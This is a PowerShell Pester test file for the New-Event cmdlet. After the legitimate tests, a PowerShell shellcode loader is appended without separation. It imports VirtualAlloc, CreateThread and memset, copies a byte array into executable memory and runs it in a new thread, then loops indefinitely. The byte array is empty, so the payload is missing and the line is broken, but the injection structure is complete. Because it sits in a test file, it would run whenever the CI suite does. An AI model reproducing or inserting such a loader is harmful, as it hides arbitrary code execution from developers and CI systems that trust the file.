Describe "New-Event" -Tags "CI" {Context "Check return type of New-Event" {It "Should return PSEventArgs as return type of New-Event" {New-Event -SourceIdentifier a | Should -BeOfType System.Management.Automation.PSEventArgs}}Context "Check New-Event can register an event"{It "Should return PesterTestMessage as the MessageData" {(New-Event -sourceidentifier PesterTimer -sender Windows.timer -messagedata "PesterTestMessage")(Get-Event -SourceIdentifier PesterTimer).MessageData  | Should -BeExactly "PesterTestMessage"Remove-Event -sourceidentifier PesterTimer}It "Should return Sender as Windows.timer" {(New-Event -sourceidentifier PesterTimer -sender Windows.timer -messagedata "PesterTestMessage")(Get-Event -SourceIdentifier PesterTimer).Sender  | Should -Be Windows.timerRemove-Event -sourceIdentifier PesterTimer}}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};